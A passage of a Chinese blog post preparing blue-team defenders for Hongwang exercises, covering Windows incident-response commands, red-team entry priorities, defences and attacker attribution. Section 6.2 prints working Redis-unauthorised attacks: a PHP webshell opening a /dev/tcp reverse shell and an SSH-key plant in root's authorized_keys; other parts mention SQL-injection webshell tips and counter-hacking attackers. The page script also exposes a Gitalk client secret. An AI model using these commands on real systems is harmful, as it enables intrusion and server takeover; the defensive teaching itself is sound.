+<h3 id="4-4-检查异常端口和进程"><a href="#4-4-检查异常端口和进程" class="headerlink" title="4.4 检查异常端口和进程"></a>4.4 检查异常端口和进程</h3><p><strong>Step 1——查看网络连接：</strong></p>
+<pre><code class="hljs cmd">netstat -ano    # 查看所有连接，定位可疑的 ESTABLISHED
+netstat -ano | <span class="hljs-built_in">findstr</span> &quot;ESTABLISHED&quot;</code></pre>
+
+<p><strong>Step 2——根据 PID 定位进程：</strong></p>
+<pre><code class="hljs cmd">tasklist | <span class="hljs-built_in">findstr</span> &quot;PID&quot;
+tasklist /svc   # 查看进程对应的服务
+
+# 查看进程对应的程序位置：
+# 任务管理器 → 选择对应进程 → 右键打开文件位置
+# 或使用 wmic
+wmic process where processid=PID get name,executablepath</code></pre>
+
+<p><strong>Step 3——使用 msinfo32 查看进程详情：</strong></p>
+<pre><code class="hljs cmd">msinfo32
+# 依次点击：软件环境 → 正在运行任务
+# 可查看进程路径、进程ID、文件创建日期、启动时间等</code></pre>
+
+<p><strong>需要关注的异常进程特征：</strong></p>
+<ul>
+<li>没有签名验证信息的进程</li>
+<li>没有描述信息的进程</li>
+<li>进程的属主不合法</li>
+<li>CPU 或内存占用长时间过高</li>
+<li>进程路径异常（如运行在临时目录、用户目录等）</li>
+</ul>
+<p><strong>工具辅助：</strong> D盾_Web 查杀工具 → 进程查看 → 关注没有签名信息的进程<br><strong>微软官方工具：</strong> Process Explorer</p>
+<h3 id="4-5-检查启动项"><a href="#4-5-检查启动项" class="headerlink" title="4.5 检查启动项"></a>4.5 检查启动项</h3><p><strong>四种检查方式：</strong></p>
+<pre><code class="hljs cmd"># 方法<span class="hljs-number">1</span>：msconfig（系统配置）
+msconfig
+# 启动 → 任务管理器 → 启动（Win10+）
+
+# 方法<span class="hljs-number">2</span>：注册表（重点关注以下键）
+regedit
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+# 方法<span class="hljs-number">3</span>：启动文件夹
+<span class="hljs-variable">%UserProfile%</span>\AppData\Roaming\Microsoft\Windows\<span class="hljs-built_in">Start</span> Menu\Programs\Startup
+
+# 方法<span class="hljs-number">4</span>：组策略
+gpedit.msc</code></pre>
+
+<h3 id="4-6-检查计划任务"><a href="#4-6-检查计划任务" class="headerlink" title="4.6 检查计划任务"></a>4.6 检查计划任务</h3><pre><code class="hljs cmd">schtasks        # 查看计划任务列表
+<span class="hljs-built_in">at</span>              # 查看旧版定时任务（用于对比）
+
+# 控制面板方式：
+# 控制面板 → 管理工具 → 任务计划程序</code></pre>
+
+<h3 id="4-7-查找可疑目录及文件"><a href="#4-7-查找可疑目录及文件" class="headerlink" title="4.7 查找可疑目录及文件"></a>4.7 查找可疑目录及文件</h3><pre><code class="hljs cmd"># 检查用户目录下是否有新建用户目录
+# Windows <span class="hljs-number">2003</span>: C:\Documents and Settings\
+# Windows <span class="hljs-number">2008</span>+: C:\Users\
+
+# 分析最近打开文件
+<span class="hljs-variable">%UserProfile%</span>\Recent
+
+# 按时间排序查找可疑文件
+<span class="hljs-built_in">dir</span> /s /od [目标目录]
+
+# 查找最近 n 天内修改过的文件
+forfiles /p C:\inetpub\wwwroot /s /d +<span class="hljs-number">7</span> /c &quot;<span class="hljs-built_in">cmd</span> /c <span class="hljs-built_in">echo</span> @<span class="hljs-built_in">path</span> @fdate @ftime&quot;</code></pre>
+
+<h3 id="4-8-系统版本和补丁信息"><a href="#4-8-系统版本和补丁信息" class="headerlink" title="4.8 系统版本和补丁信息"></a>4.8 系统版本和补丁信息</h3><pre><code class="hljs cmd">systeminfo                     # 查看系统版本和已安装补丁
+
+# 重点关注：
+# - 系统启动时间（是否异常重启）
+# - 已安装的补丁（是否存在可利用漏洞未修复）
+# - 网卡配置（是否多 IP、异常 DNS）</code></pre>
+
+<h3 id="4-9-服务自启动检查"><a href="#4-9-服务自启动检查" class="headerlink" title="4.9 服务自启动检查"></a>4.9 服务自启动检查</h3><pre><code class="hljs cmd">services.msc     # 查看所有服务
+sc query         # 命令行查看服务列表
+
+# 重点关注：
+# - 启动类型为&quot;自动&quot;但不认识的服务
+# - 非微软签名的服务
+# - 最近新增的服务（配合日志 ID <span class="hljs-number">7045</span>）</code></pre>
+
+<hr>
+<h2 id="五、打点策略与攻击面理解"><a href="#五、打点策略与攻击面理解" class="headerlink" title="五、打点策略与攻击面理解"></a>五、打点策略与攻击面理解</h2><h3 id="5-1-红队打点的一般顺序"><a href="#5-1-红队打点的一般顺序" class="headerlink" title="5.1 红队打点的一般顺序"></a>5.1 红队打点的一般顺序</h3><p>红队打点通常按以下优先级：</p>
+<p><strong>第一梯队——Java 反序列化类（高权限、成功率最高）：</strong></p>
+<ul>
+<li>Shiro（RememberMe 反序列化）</li>
+<li>Fastjson（@type 反序列化）</li>
+<li>WebLogic（T3&#x2F;XML&#x2F;SSRF）</li>
+<li>用友 OA、致远 OA 等 OA 系统历史漏洞</li>
+<li>Spring Cloud Gateway（CVE-2022-22947）</li>
+</ul>
+<p><strong>第二梯队——Web 漏洞类：</strong></p>
+<ul>
+<li>文件上传（直接 getshell）</li>
+<li>RCE（命令执行、代码执行）</li>
+<li>SQL 注入（可能写 WebShell）</li>
+</ul>
+<p><strong>第三梯队——弱口令&#x2F;未授权类：</strong></p>
+<ul>
+<li>后台弱口令</li>
+<li>数据库弱口令</li>
+<li>Redis 未授权访问</li>
+<li>Elasticsearch 未授权访问</li>
+</ul>
+<p><strong>为什么 Java 反序列化优先级高：</strong> Java Web 程序通常以高权限运行（部分可能降权），成功即可直接控制服务器。</p>
+<h3 id="5-2-蓝队防守打点阶段"><a href="#5-2-蓝队防守打点阶段" class="headerlink" title="5.2 蓝队防守打点阶段"></a>5.2 蓝队防守打点阶段</h3><ol>
+<li><p><strong>反序列化类防守：</strong></p>
+<ul>
+<li>及时更新组件版本</li>
+<li>WAF 规则覆盖反序列化 Payload 特征</li>
+<li>关注 <code>@type</code>、<code>T3</code> 协议、<code>rmi://</code>、<code>ldap://</code> 等特征</li>
+<li>部署 RASP 或类似方案检测反序列化利用</li>
+</ul>
+</li>
+<li><p><strong>文件上传类防守：</strong></p>
+<ul>
+<li>白名单验证后缀</li>
+<li>上传目录禁止解析脚本</li>
+<li>随机重命名文件</li>
+</ul>
+</li>
+<li><p><strong>中间件管理端口保护：</strong></p>
+<ul>
+<li>Tomcat&#x2F;JBoss&#x2F;WebLogic 管理端口不对外</li>
+<li>添加双因素认证或至少强密码</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="六、补充排查命令与工具速查"><a href="#六、补充排查命令与工具速查" class="headerlink" title="六、补充排查命令与工具速查"></a>六、补充排查命令与工具速查</h2><h3 id="6-1-扫描器-vs-手工流量判断"><a href="#6-1-扫描器-vs-手工流量判断" class="headerlink" title="6.1 扫描器 vs 手工流量判断"></a>6.1 扫描器 vs 手工流量判断</h3><table>
+<thead>
+<tr>
+<th>判断维度</th>
+<th>扫描器特征</th>
+<th>手工特征</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>请求频率</td>
+<td>高速连续，毫秒级间隔</td>
+<td>低速，间隔较长</td>
+</tr>
+<tr>
+<td>命中率</td>
+<td>大量 404，盲目扫描</td>
+<td>先探测再利用</td>
+</tr>
+<tr>
+<td>UA 头</td>
+<td>常见 sqlmap、AWVS 等默认 UA</td>
+<td>正常浏览器 UA</td>
+</tr>
+<tr>
+<td>Payload</td>
+<td>大量测试语句</td>
+<td>针对性 Payload</td>
+</tr>
+<tr>
+<td>攻击模式</td>
+<td>一套脚本自动化测试</td>
+<td>逐步骤人工操作</td>
+</tr>
+</tbody></table>
+<p><strong>蓝队应对：</strong> 扫描器流量特征明显，WAF 或态势感知可直接识别。但经验丰富的红队会使用慢速扫描、代理池、修改默认 UA 等方式对抗。需要结合多维度判断。</p>
+<h3 id="6-2-反弹-Shell-写入方式"><a href="#6-2-反弹-Shell-写入方式" class="headerlink" title="6.2 反弹 Shell 写入方式"></a>6.2 反弹 Shell 写入方式</h3><p><strong>通过 Redis 未授权访问写 Shell：</strong></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># 连接 Redis</span>
+redis-cli -h target_ip
+
+<span class="hljs-comment"># 写入反弹 Shell（利用 Redis 持久化功能）</span>
+config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/www/html
+config <span class="hljs-built_in">set</span> dbfilename shell.php
+<span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;&lt;?php system(&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#x27;);?&gt;&quot;</span>
+save</code></pre>
+
+<p><strong>通过 SSH key 登录（Redis 未授权）：</strong></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># 将自己的 SSH 公钥写入 Redis，再写入目标 ~/.ssh/authorized_keys</span>
+config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh/
+config <span class="hljs-built_in">set</span> dbfilename authorized_keys
+<span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;ssh-rsa AAAAB3...your-public-key...&quot;</span>
+save</code></pre>
+
+<h3 id="6-3-SQL-注入写-WebShell-实战要点"><a href="#6-3-SQL-注入写-WebShell-实战要点" class="headerlink" title="6.3 SQL 注入写 WebShell 实战要点"></a>6.3 SQL 注入写 WebShell 实战要点</h3><ol>
+<li>需要 Web 目录绝对路径（可通过报错、phpinfo 等获取）</li>
+<li>确认 MySQL 用户的 <code>FILE</code> 权限</li>
+<li>确认 <code>secure_file_priv</code> 配置</li>
+<li>使用 <code>into dumpfile</code> 而非 <code>into outfile</code>（避免转义问题）</li>
+<li>注意写入文件的权限：Web 用户需能读取</li>
+</ol>
+<h3 id="6-4-横向渗透攻击判断"><a href="#6-4-横向渗透攻击判断" class="headerlink" title="6.4 横向渗透攻击判断"></a>6.4 横向渗透攻击判断</h3><p><strong>判断依据：</strong> 检测到用户账户来自于不正常或非授权系统，或者在不正常或非授权系统中使用——这种情况下存在横向渗透攻击。</p>
+<p><strong>检测侧重点：</strong></p>
+<ul>
+<li>同一个账号在短时间内从多台主机登录</li>
+<li>管理账号从非管理主机登录</li>
+<li>非业务时间异常登录</li>
+<li>使用明文协议（Telnet、FTP）的横向连接</li>
+</ul>
+<hr>
+<h2 id="七、溯源反制与研判实践"><a href="#七、溯源反制与研判实践" class="headerlink" title="七、溯源反制与研判实践"></a>七、溯源反制与研判实践</h2><h3 id="7-1-溯源常用方法"><a href="#7-1-溯源常用方法" class="headerlink" title="7.1 溯源常用方法"></a>7.1 溯源常用方法</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>操作要点</th>
+<th>典型场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IP 定位</td>
+<td>通过 IP 地理信息定位，注意代理 IP 干扰</td>
+<td>基础溯源</td>
+</tr>
+<tr>
+<td>ID 追踪</td>
+<td>搜索引擎 + 社交平台 + 技术论坛 + 社工库</td>
+<td>发现攻击者 ID 后</td>
+</tr>
+<tr>
+<td>URL Whois</td>
+<td>域名注册信息查询，可能获取姓名&#x2F;电话&#x2F;邮箱</td>
+<td>钓鱼域名</td>
+</tr>
+<tr>
+<td>恶意样本分析</td>
+<td>提取样本中 ID、邮箱、C2、同源分析</td>
+<td>后门文件分析</td>
+</tr>
+<tr>
+<td>社交账号</td>
+<td>利用 JSONP 接口获取浏览器信息&#x2F;真实 IP</td>
+<td>攻击者访问特定页面</td>
+</tr>
+<tr>
+<td>反向渗透</td>
+<td>对攻击者服务器进行端口扫描和渗透</td>
+<td>高级溯源</td>
+</tr>
+</tbody></table>
+<h3 id="7-2-研判与上报实操"><a href="#7-2-研判与上报实操" class="headerlink" title="7.2 研判与上报实操"></a>7.2 研判与上报实操</h3><p><strong>研判前准备工作：</strong></p>
+<ul>
+<li>提前了解客户网络拓扑和部署的设备情况</li>
+<li>排除常见干扰告警：挖矿、蠕虫、病毒、DoS 等（直接过滤减少数量）</li>
+<li>准备好威胁情报工具（微步在线、奇安信威胁情报中心、绿盟威胁情报云）</li>
+</ul>
+<p><strong>研判核心思路：</strong></p>
+<blockquote>
+<p>真实攻击不可能只持续一次——它一定是长时间、周期性、多 IP 的进行攻击。</p>
+</blockquote>
+<p><strong>单条告警判断方法：</strong></p>
+<ol>
+<li>使用威胁情报平台查询源 IP 恶意评分</li>
+<li>排除内部设备和已知扫描器 IP</li>
+<li>检查告警中请求方法、路径、参数是否包含恶意 Payload</li>
+<li>查看是否有实际攻击成功的回显</li>
+</ol>
+<p><strong>上报要点（防守关键）：</strong></p>
+<ul>
+<li>提供完整截图（源 IP、目的 IP、请求包请求体、响应包响应体）</li>
+<li>不要忽略内网告警（需要同样关注）</li>
+<li>在必要时往前推排查时间（攻击者可能早已进入）</li>
+</ul>
+<p><strong>研判团队协作：</strong> 多人同时值守时，建立统一的事件上报平台，避免多人重复处理同一条告警。</p>
+<h3 id="7-3-攻击者画像"><a href="#7-3-攻击者画像" class="headerlink" title="7.3 攻击者画像"></a>7.3 攻击者画像</h3><table>
+<thead>
+<tr>
+<th>画像维度</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击路径</td>
+<td>入口 → 横向移动 → 落脚点 → 目标</td>
+</tr>
+<tr>
+<td>攻击目的</td>
+<td>拿权限、窃数据、搞破坏</td>
+</tr>
+<tr>
+<td>网络代理</td>
+<td>代理 IP、跳板机、C2 服务器、VPN</td>
+</tr>
+<tr>
+<td>攻击手法</td>
+<td>钓鱼、Web 渗透、水坑、近源渗透、社工</td>
+</tr>
+<tr>
+<td>虚拟身份</td>
+<td>ID、昵称、网名、论坛账号</td>
+</tr>
+<tr>
+<td>真实身份</td>
+<td>姓名、物理位置</td>
+</tr>
+<tr>
+<td>联系方式</td>
+<td>手机号、QQ&#x2F;微信、邮箱</td>
+</tr>
+<tr>
+<td>组织情况</td>
+<td>单位名称、职位信息</td>
+</tr>
+</tbody></table>
+<hr>
+<blockquote>
+<p><strong>声明：</strong> 本文所有内容仅用于合法的安全防御学习、蓝队能力建设和护网演练准备。禁止用于未授权的网络攻击行为。</p>
+</blockquote>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">swfk2154</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://blogbu2154.site/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E5%AE%9E%E6%88%98%E6%93%8D%E4%BD%9C%E8%A1%A5%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5%E5%AE%9E%E6%93%8D%C2%B7%E6%B7%B1%E5%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%C2%B7%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">https://blogbu2154.site/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E5%AE%9E%E6%88%98%E6%93%8D%E4%BD%9C%E8%A1%A5%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5%E5%AE%9E%E6%93%8D%C2%B7%E6%B7%B1%E5%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%C2%B7%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">swfk2154</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%8A%A4%E7%BD%91/">
+                                    <span class="chip bg-color">护网</span>
+                                </a>
+                            
+                                <a href="/tags/HVV/">
+                                    <span class="chip bg-color">HVV</span>
+                                </a>
+                            
+                                <a href="/tags/%E8%93%9D%E9%98%9F/">
+                                    <span class="chip bg-color">蓝队</span>
+                                </a>
+                            
+                                <a href="/tags/%E9%9D%A2%E8%AF%95/">
+                                    <span class="chip bg-color">面试</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'Ov23li9GpL8Lrygn6GlO',
+        clientSecret: '59d9c3e900f7b7a32d08f23652d74ca75ef1ef9e',
+        repo: 'swfk2154.github.io',
+        owner: 'swfk2154',
+        admin: "swfk2154",
+        id: '2026-06-24T14-00-00',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E5%AE%9E%E6%88%98%E6%93%8D%E4%BD%9C%E8%A1%A5%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5%E5%AE%9E%E6%93%8D%C2%B7%E6%B7%B1%E5%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%C2%B7%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="护网蓝队实战操作补全（二）——应急排查实操·深度漏洞分析·提权手法与溯源反制">
+                        
+                        <span class="card-title">护网蓝队实战操作补全（二）——应急排查实操·深度漏洞分析·提权手法与溯源反制</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            本篇文章作为《护网-HVV-面试题大全.md》和《护网蓝队基础补全（一）》的第二弹配套补充，聚焦于面试中容易问到的深度技术细节和实战操作，涵盖 SQL 注入深度补充、提权手法详解、应急排查标准操作、反序列化利用与防御、不出网场景处理、Win
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-06-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category">
+                                    安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%8A%A4%E7%BD%91/">
+                        <span class="chip bg-color">护网</span>
+                    </a>
+                    
+                    <a href="/tags/HVV/">
+                        <span class="chip bg-color">HVV</span>
+                    </a>
+                    
+                    <a href="/tags/%E8%93%9D%E9%98%9F/">
+                        <span class="chip bg-color">蓝队</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%A2%E8%AF%95/">
+                        <span class="chip bg-color">面试</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="护网蓝队基础补全（一）——网络基础·漏洞速查·安全加固·面试高频">
+                        
+                        <span class="card-title">护网蓝队基础补全（一）——网络基础·漏洞速查·安全加固·面试高频</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            本篇文章作为《护网-HVV-面试题大全.md》的配套补充，聚焦于护网蓝队面试中的基础知识、常见漏洞原理速查、中间件漏洞、护网流程、安全加固、内网渗透基础、权限提升、内存马分类、渗透测试流程、英语术语等主题。适合初学者系统补全知识体系。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-06-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category">
+                                    安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%8A%A4%E7%BD%91/">
+                        <span class="chip bg-color">护网</span>
+                    </a>
+                    
+                    <a href="/tags/HVV/">
+                        <span class="chip bg-color">HVV</span>
+                    </a>
+                    
+                    <a href="/tags/%E8%93%9D%E9%98%9F/">
+                        <span class="chip bg-color">蓝队</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%A2%E8%AF%95/">
+                        <span class="chip bg-color">面试</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank">swfk2154</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/swfk2154" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
